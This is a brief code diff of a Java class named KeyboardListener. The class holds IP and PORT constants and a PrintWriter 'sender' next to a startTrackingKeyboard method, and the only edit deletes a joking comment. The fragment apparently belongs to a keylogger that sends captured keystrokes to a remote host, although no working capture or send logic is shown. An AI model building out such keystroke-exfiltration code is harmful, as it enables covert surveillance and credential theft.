@@ -14,7 +14,7 @@ public class KeyboardListener implements NativeKeyListener {
     public static final String IP = "";
     public static final int PORT = 1;
 
-    private static PrintWriter sender;//lmao
+    private static PrintWriter sender;
 
     public static void startTrackingKeyboard() {
         try {
